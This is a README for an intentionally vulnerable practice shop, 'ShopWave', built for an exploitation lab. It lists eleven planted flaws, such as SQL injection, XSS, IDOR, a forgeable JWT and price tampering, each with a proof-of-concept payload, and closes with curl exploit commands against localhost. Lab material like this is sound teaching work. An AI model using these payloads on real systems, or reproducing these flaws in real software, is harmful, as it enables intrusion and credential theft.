# Planted vulnerabilities — ShopWave

Deliberate flaws for the harness exploitation lab. Each maps to a class from `../docs/project_flow.md` (§8 support matrix).
PoCs assume the app at `http://localhost:8080` (use `http://192.168.210.1:8081` from the Kali VM).

| # | Class | Where | PoC |
|---|---|---|---|
| 1 | **SQL Injection** | `GET /api/products?search=` and `/search?q=`; `product/[id]` id | `curl "http://localhost:8080/api/products?search=%27"` (DB error) ; `?search=' UNION SELECT 1,email,password,4,5,6,7,8 FROM users-- -` |
| 2 | **Auth bypass (SQLi)** | `POST /api/auth/login` | `curl -X POST .../api/auth/login -H 'Content-Type: application/json' -d '{"email":"admin@shopwave.test'\'' -- ","password":"x"}'` → logs in without the password |
| 3 | **Reflected XSS** | `/search?q=` | `/search?q=<script>alert(1)</script>` (rendered raw) |
| 4 | **Stored XSS** | `POST /api/reviews` → `/product/[id]` | post a review with body `<img src=x onerror=alert(1)>` |
| 5 | **Broken Access Control / IDOR** | `GET /api/orders/[id]`, `GET /api/users/[id]` | `curl .../api/orders/1`, `curl .../api/users/2` (any user's order/PII, incl. password — no authz) |
| 6 | **Broken Access Control (admin)** | `GET /api/admin/users`, page `/admin` | `curl .../api/admin/users` returns all users unauthenticated |
| 7 | **Excessive data exposure** | `/api/users/[id]`, `/api/admin/users` | responses include plaintext `password` |
| 8 | **Weak/forgeable JWT** | session cookie `token` | signed with hardcoded secret `secret` → forge `{"uid":1,"role":"admin"}` |
| 9 | **Price tampering (business logic)** | `POST /api/checkout` | client-supplied `total` is trusted; `{"items":[{"product_id":1,"qty":1}],"total":0.01}` |
| 10 | **Security misconfiguration** | app-wide | no security headers (CSP/HSTS/X-Frame-Options), verbose DB errors returned to clients |
| 11 | **Plaintext password storage** | `users.password` | seeded + stored in cleartext |

## Quick exploit examples

```bash
B=http://localhost:8080
# SQLi: dump users via UNION (8 product columns: id,name,description,price,category,emoji,stock,rating)
curl -s "$B/api/products?search=xxx' UNION SELECT 1,email,password,4,'x','y',6,7 FROM users-- -" | head

# Auth bypass
curl -s -X POST "$B/api/auth/login" -H 'Content-Type: application/json' \
  -d '{"email":"admin@shopwave.test'"'"' -- ","password":"anything"}'

# IDOR — read another user's order / PII
curl -s "$B/api/orders/1"; curl -s "$B/api/users/3"

# Broken access control — dump all customers unauthenticated
curl -s "$B/api/admin/users"

# Price tampering — pay $0.01
curl -s -X POST "$B/api/checkout" -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":1,"qty":1}],"total":0.01}'
```
